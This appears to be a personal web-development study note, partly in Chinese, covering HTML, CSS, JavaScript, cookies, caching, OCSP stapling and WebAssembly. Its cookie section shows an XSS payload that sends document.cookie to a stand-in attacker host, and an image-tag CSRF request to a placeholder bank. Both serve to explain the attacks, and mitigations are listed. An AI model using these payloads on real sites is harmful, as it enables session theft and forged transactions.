# Web 技术

## HTTP

- [互联网协议入门](http://www.ruanyifeng.com/blog/2012/05/internet_protocol_suite_part_i.html)
- [99%的人都理解错了 HTTP 中 GET 与 POST 的区别](https://zhuanlan.zhihu.com/p/22536382)
- [聊聊 HTTPS 和 SSL/TLS 协议](http://mp.weixin.qq.com/s?__biz=MjM5ODE0MTM1MA==&mid=204884896&idx=1&sn=039ecac06ffc7e57e3d38f6d54480492#rd)
- [webim 如何保证消息的可靠投递](http://www.habadog.com/2015/04/29/webim-msg-send-ack/)

## HTML

HTML（Hyper Text Markup Language），超文本标记语言。

1991 年，HTML1 开始研发。

1993 年，HTML1 发布。

1999 年 12 月，HTML4 发布。

2004 年，WHATWG 提出 Web Applications 1.0，HTML5 草案的前身。

2006 年，W3C 与 WHATWG 决定合作，推进新版 HTML。

2008 年 01 月，HTML5 第一份正式草案公布。

2014 年 10 月，W3C 宣布 HTML5 正式公布发布。

Tags name and attribute name are case-insensitive, but it's considered a good practice to keep HTML markup lowercase.

Attribute values are case sensitive, that's because the names are part of the spec, values are whatever the user wants them to be.

Entity names are case-senstive. For example, Ç is `&Ccedil;` and ç is `&ccedil;`.

Entity numbers are base 10. For example, & is `&#38;` € is `&#8364;`.

- [HTML5 定稿：手机 App 三年内将彻底消失？](http://mp.weixin.qq.com/s?__biz=MzAxODIwNzc4NQ==&mid=204304446&idx=1&sn=aec247fc38409da7b2c5cea0ace35f6d)

## CSS

- [CSS: From Zero to Hero](https://dev.to/aspittel/css-from-zero-to-hero-3o16)
- [CSS 实现垂直居中的常用方法](http://www.cnblogs.com/yugege/p/5246652.html)
- [浅谈 Web 自适应](http://www.cnblogs.com/constantince/p/5708930.html)
- [伪元素的妙用–单标签之美](http://web.jobbole.com/86261/)
- [酷酷的 CSS3 三角形运用](http://www.cnblogs.com/keepfool/p/5616326.html)
- [用 CSS3 绘制你需要的几何图形](http://www.cnblogs.com/wdlhao/p/5751211.html)
- [CSS 魔法堂：Box-Shadow 没那么简单啦:)](http://web.jobbole.com/86168/)
- [Understanding Flexbox: Everything you need to know](https://medium.freecodecamp.org/understanding-flexbox-everything-you-need-to-know-b4013d4dc9af)
- [写给自己看的 display: flex 布局教程](https://www.zhangxinxu.com/wordpress/2018/10/display-flex-css3-css/)
- [Understanding Layout Algorithms](https://www.joshwcomeau.com/css/understanding-layout-algorithms/)
- [An Interactive Guide to Flexbox](https://www.joshwcomeau.com/css/interactive-guide-to-flexbox/)
- [Tree views in css](https://iamkate.com/code/tree-views/)
- [Building a Magical 3D Button](https://www.joshwcomeau.com/animation/3d-button/)

```css
html {
  max-width: 70ch;
  padding: 3em 1em;
  margin: auto;
  line-height: 1.75;
  font-size: 1.25em;
}

h1,
h2,
h3,
h4,
h5,
h6 {
  margin: 3em 0 1em;
}
p,
ul,
ol {
  margin-bottom: 2em;
  color: #1d1d1d;
  font-family: sans-serif;
}
```

### 让简体中文变成繁体中文

```css
body {
  font-family: "PingFang SC", "Yu Gothic", system-ui;
  font-variant-east-asian: traditional;
}
```

“苹方字体”包含繁体变体，是 Apple 公司很多系统的默认中文字体。
Windows 用户也可以安装苹方字体。
Windows 系统内置的"Yu Gothic"（游黑體日）字体只能转换日语中的部分汉字。
反过来不行，原来是繁体的，不能变成简体。

Use CSS' filter to create dark mode:

```css
html {
  filter: invert(1);
}
```

### 面包屑菜单

```html
<!--css-->
ul li { display: inline-block; font-weight: bold; } ul li:not(:last-child):after
{ content: '\276D'; margin: 5px; }

<!--html-->
<ul>
  <li>首页</li>
  <li>商品</li>
  <li>详情</li>
</ul>
```

### 加载中... 动画

```css
<!--css-->
.loading:after {
    content: ".";
    animation: loading 2s ease infinite;
}

@keyframes loading {
    33% {
        content: "..";
    }
    66% {
        content: "...";
    }
}

<!--html-->
<p class="loading">加载中 </p>
```

### 添加章节数

```html
<!--css-->
ul{ counter-reset: section; } li{ list-style-type: none; counter-increment:
section; } li:before{ content: counters(section, '-') '.'; }

<!--html-->
<ul>
  <li>章节一</li>
  <li>
    章节二
    <ul>
      <li>章节二一</li>
      <li>章节二二</li>
      <li>章节二三</li>
    </ul>
  </li>
  <li>章节三</li>
  <li>章节四</li>
  <li>
    章节五
    <ul>
      <li>章节五一</li>
      <li>章节五二</li>
    </ul>
  </li>
  <li>章节六</li>
</ul>
```

## JavaScript

### 演进阶段

- Stage 0 Strawperson
  - Allow input into the specification
- Stage 1 Proposal
  - Make the case for the addition
  - Describe the shape of a solution
  - Identify potential challenges
- Stage 2 Draft
  - Precisely describe the syntax and semantics using formal spec language
- Stage 3 Candidate
  - Indicate that further refinement will require feedback from implementations and users
- Stage 4 Finished
  - Indicate that the addition is ready for inclusion in the formal ECMAScript standard

### Outputting JavaScript debugging messages to the browser

1. Popping up messages with `alert()`.
2. Logging lines to console with `console.log()`.
3. Pausing code execution with the `debugger` statement.

### 不使用分号结尾

1. 在以 **`` +-[(/`  ``** 开头的语句前面都加上一个分号，或者避免以这些字符开头，如

```js
(a + b).toString();
```

Instead of this:

```
;[1, 2, 3].forEach(bar)
```

This is strongly preferred:

```
var nums = [1, 2, 3]
nums.forEach(bar)
```

2. return 关键字后面不要换行

JavaScript 有自动分号插入的机制 (Automatic Semicolon Insertion)，简称 ASI。

如果你这样写代码：

```
return
a + b
```

那么自动分号插入后会这样：

```
return;
a + b;
```

## Symbol 类型

```javascript
const s1 = Symbol();
const s2 = Symbol();
console.log(s1 === s2); // false

const s3 = Symbol("debug");
console.log(s3); // Symbol(debug)

const obj = {};
const sym = Symbol();
obj[sym] = "foo";
obj.bar = "bar";
obj[sym]; // foo
sym in obj; // true
JSON.stringify(obj); // "{"bar":"bar"}"
Object.keys(obj); // ['bar']
Reflect.ownKeys(obj); // ["bar", Symbol()]
```

1. Symbol 类型的值可以用作对象的属性键，在不同的包需要操作同一个对象时可以保证键值的唯一性。
2. Symbol 键值可以模拟私有属性，JSON 序列化将不包含它的值，JSON 只允许字符串作为键值。
3. 实例化 Symbol 时可以提供一个字符串参数。此值只用于调试代码，不会影响 symbol 本身。

- [总结 ES6 常用的新特性](http://luckykun.com/work/2016-05-10/es6-feature.html)
- [30 行代码实现 Javascript 中的 MVC](http://www.cnblogs.com/front-end-ralph/p/5190442.html)
- [JavaScript 节流函数 Throttle 详解](https://keelii.github.io/2016/06/11/javascript-throttle/)
- [用 ParallelJS 并行处理 JavaScript](http://web.jobbole.com/86557/)
- [JavaScript 资源大全中文版](https://github.com/jobbole/awesome-javascript-cn)
- [让 Javascript 优雅如诗](http://www.ycwalker.com/2016/09/19/elegant-javascript/)
- [JavaScript 模块化入门 Ⅰ：理解模块](https://zhuanlan.zhihu.com/p/22890374)
- [跨域问题，解决之道](http://blog.720ui.com/2016/web_cross_domain/)
- [Make small focused modules](https://github.com/sindresorhus/ama/issues/10#issuecomment-117766328)
- [HACKING SEMICOLONS](https://slides.com/evanyou/semicolons)
- [The Evolution of Async JavaScript: From Callbacks, to Promises, to Async/Await](https://tylermcginnis.com/async-javascript-from-callbacks-to-promises-to-async-await/)
- [深入理解 ES7 的 async/await](http://coolcao.com/2016/12/12/deeper-understanding-of-async-await/)
- [Zoom Image Point With Mouse Wheel](https://dev.to/stackfindover/zoom-image-point-with-mouse-wheel-11n3)

print a byte count in a human readable format

```java
public static String humanReadableByteCount(long bytes, boolean si) {
    int unit = si ? 1000 : 1024;
    if (bytes < unit) return bytes + " B";
    int exp = (int) (Math.log(bytes) / Math.log(unit));
    String pre = (si ? "kMGTPE" : "KMGTPE").charAt(exp-1) + (si ? "" : "i");
    return String.format("%.1f %sB", bytes / Math.pow(unit, exp), pre);
}
```

# Cookie

Cookies are data, stored in small text files, on your computer.

An HTTP cookie (web cookie, browser cookie) is a small piece of data that a server sends to the user's web browser. The browser may store it and send it back with the next request to the same server. Typically, it's used to tell if two requests came from the same browser — keeping a user logged-in, for example. It remembers stateful information for the stateless HTTP protocol.

The Domain and Path directives define the scope of the cookie: what URLs the cookies should be sent to.

Domain specifies allowed hosts to receive the cookie.

- If Domain is specified, then subdomains are always included.
- If unspecified, it defaults to the host of the current document location, excluding subdomains.

Path indicates a URL path that must exist in the requested URL in order to send the Cookie header. The %x2F ("/") character is considered a directory separator, and subdirectories will match as well.

You can specify an expiry date (in UTC time) for a cookie. If not specified, the cookie will have the lifetime of a session cookie. A session is finished when the browser is closed and session cookies will get removed at that point. However, some web browsers have a feature called session restore that will save all your tabs and have them come back next time you use the browser.

```javascript
function getCookies() {
  let cookies = {};
  const items = document.cookie.split(";");
  for (const item of items) {
    const [key, value] = item.split("=").map((s) => s.trim());
    cookies[key] = decodeURIComponent(value);
  }
  return cookies;
}

function getCookie(key) {
  const match = document.cookie.match("(^|;)\\s*" + key + "\\s*=\\s*([^;]+)");
  return match ? decodeURIComponent(match.pop()) : "";
}

function setCookie(key, value, days) {
  const ms = Date.now() + days * 24 * 60 * 60 * 1000;
  const date = new Date(ms).toUTCString();
  document.cookie = `${key}=${encodeURIComponent(
    value
  )};expires=${date};path=/`;
}
```

## Session hijacking and Cross-site scripting (XSS)

Cookies are often used in web application to identify a user and their authenticated session, so stealing a cookie can lead to hijacking the authenticated user's session. Common ways to steal cookies include Social Engineering or exploiting an XSS vulnerability in the application.

```javascript
new Image().src =
  "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
```

## Cross-site request forgery (CSRF)

Wikipedia mentions a good example for CSRF. In this situation, someone includes an image that isn’t really an image (for example in an unfiltered chat or forum), instead it really is a request to your bank’s server to withdraw money:

```html
<img
  src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory"
/>
```

Now, if you are logged into your bank account and your cookies are still valid (and there is no other validation), you will transfer money as soon as you load the HTML that contains this image. There are a few techniques that are used to prevent this from happening:

- As with XSS, input filtering is important.
- There should always be a confirmation required for any sensitive action.
- Cookies that are used for sensitive actions should have a short lifetime only.

# Cache Control

```
<meta http-equiv="cache-control" content="no-cache">
```

no-cache: 先发送请求，与服务器确认该资源是否被更改，如果未被更改，则使用缓存。
no-store: 不允许缓存，每次都要去服务器上，下载完整的响应。（安全措施）
public : 缓存所有响应，但并非必须。因为 max-age 也可以做到相同效果
private : 只为单个用户缓存，因此不允许任何中继进行缓存。（比如说 CDN 就不允许缓存 private 的响应）
maxage : 表示当前请求开始，该响应在多久内能被缓存和重用，而不去服务器重新请求。例如：max-age=60 表示响应可以再缓存和重用 60 秒。

输入网址后按回车或点击转到按钮，浏览器会对没有过期的内容直接使用本地缓存。
按 F5 或浏览器刷新按钮，浏览器会再请求中附加必要的缓存协商，Last-Modified、ETag 会更新，但 Expires 不变。
ctrl+F5 强制刷新，浏览器会发起一个全新的请求，不会使用任何缓存。

## Svg

- [SVG 图像入门教程](http://www.ruanyifeng.com/blog/2018/08/svg.html)
- [Create diagrams using Graphviz](https://ncona.com/2020/06/create-diagrams-with-code-using-graphviz/)

## Font

- [TrueType 入门：基本概念](https://mp.weixin.qq.com/s/4ITS940TWItraV5NZGGDWw)

## Design

- [解读设计风格的变迁史](http://www.jianshu.com/p/3bb4f671094f)
- [色彩想象力－迷之渐变色](https://blog.maxleap.cn/archives/1201)

## Tools

- [HTTPie — a command line HTTP client](https://httpie.org/)
- [mitmproxy — interactive examination and modification of HTTP traffic](https://mitmproxy.org/)
- [The best HTTP Static File Server](https://github.com/codeskyblue/gohttpserver)
- [DevDocs: API Documentation Browser](http://devdocs.io/)
- [Text encoder decoder, format converter](https://toolkit.site/)
- [The Front-End Developer's Guide to the Terminal](https://www.joshwcomeau.com/javascript/terminal-for-js-devs/)

## Open Source

- [Art of README](https://github.com/noffle/art-of-readme/blob/master/README-zh.md)

# Web 协议

Ocsp stapling
Ocsp 全称在线证书状态检查协议 (rfc6960)，用来向 CA 站点查询证书状态，比如是否撤销。通常情况下，浏览器使用 OCSP 协议发起查询请求，CA 返回证书状态内容，然后浏览器接受证书是否可信的状态。

这个过程非常消耗时间，因为 CA 站点有可能在国外，网络不稳定，RTT 也比较大。那有没有办法不直接向 CA 站点请求 OCSP 内容呢？ocsp stapling 就能实现这个功能。

详细介绍参考 RFC6066 第 8 节。简述原理就是浏览器发起 client hello 时会携带一个 certificate status request 的扩展，服务端看到这个扩展后将 OCSP 内容直接返回给浏览器，完成证书状态检查。

由于浏览器不需要直接向 CA 站点查询证书状态，这个功能对访问速度的提升非常明显。

Nginx 目前已经支持这个 ocsp stapling file，只需要配置 ocsp stapling file 的指令就能开启这个功能：

ssl_stapling on;ssl_stapling_file ocsp.staple;

# PWA

https://love2dev.com/blog/15-minute-progressive-web-app-upgrade/
https://developer.mozilla.org/en-US/docs/Web/Manifest
https://github.com/lyzadanger/serviceworker-example
https://web.dev/pwa-checklist/
https://web.dev/customize-install/
https://googlechrome.github.io/samples/service-worker/custom-offline-page/index.html
https://medium.com/james-johnson/a-simple-progressive-web-app-tutorial-f9708e5f2605

Buttons are the “killer feature” of the web.

Every significant thing we do online, from ordering food to scheduling an appointment to playing a video, involves pressing a button. Buttons (and the forms they submit) make the web dynamic and interactive and powerful.

# WebAssembly

WebAssembly is a portable binary instruction format for a stack-based virtual machine.

There are a number of advantages to a stack machine that made it an appealing choice for WebAssembly: their small binary size, efficient instruction coding, and ease of portability just to name a few.

The compiled WebAssembly binary is called a module and the host is responsible for interpreting it. All I/O and other interactions are done entirely at the behest of the host such as a browser or a console application.

The contract between a WebAssembly module and its host is a very basic, low-level contract built from numeric primitives. That contract defines how linear memory is accessed, how parameter values can be passed to functions, how we can invoke functions exported from a module, and within the module, invoke functions imported from the host.

## Data Types

Assembly languages are designed to be made up of primitives that can be used as building blocks by higher level languages. WebAssembly 1.0 has exactly four data types:

Type | Description
=====|=============
i32 | 32-Bit Integer
i64 | 64-Bit Integer
f32 | 32-Bit Floating Point Number
f64 | 64-Bit Floating Point Number

WebAssembly doesn’t assign any intrinsic signed-ness to numbers as they’re stored. The assumption of whether a number is signed or unsigned is only performed at the time of an operation according to arithmetic operators.

## Linear Memory

WebAssembly doesn’t have a heap in the traditional sense. Instead, WebAssembly has linear memory. This is a contiguous block of bytes that can be declared internally within the module, exported out of a module, or imported from the host.

WebAssembly module can grow the lineary memory block in increments called pages of 64KB if it needs more space. The host can read and write any linear memory given to a wasm module at any time, the wasm module can never access any of the host’s memory.

WebAssembly is a provably type-safe language. All accesses to memory are required to be bounds-checked. WebAssembly has no undefined behavior and no stuck states. The call stack is inaccessible from the program.

## Instructions

An example of a WebAssembly function that computes the quantity: f(x)=2x^2+1.

    (func $f (param $x i32) (result i32)
                     ;; stack: []
      (get_local $x) ;; stack: [x]
      (get_local $x) ;; stack: [x, x]
      (i32.mul)      ;; stack: [x*x]

      (i32.const 2)  ;; stack: [2, x*x]
      (i32.mul)      ;; stack: [2*x*x]

      (i32.const 1)  ;; stack: [1, 2*x*x]
      (i32.add))     ;; stack: [2*x*x+1]

Most instructions in WebAssembly modify the value stack in some way. In the function above,`get_local`pushes the parameter`x`onto the stack.`i32.mul`pops two values from the stack, multiplies them, and pushes the result back onto the stack.`i32.const N`pushes the value`N`onto the stack. The function implicitly returns the value at the top of the stack.
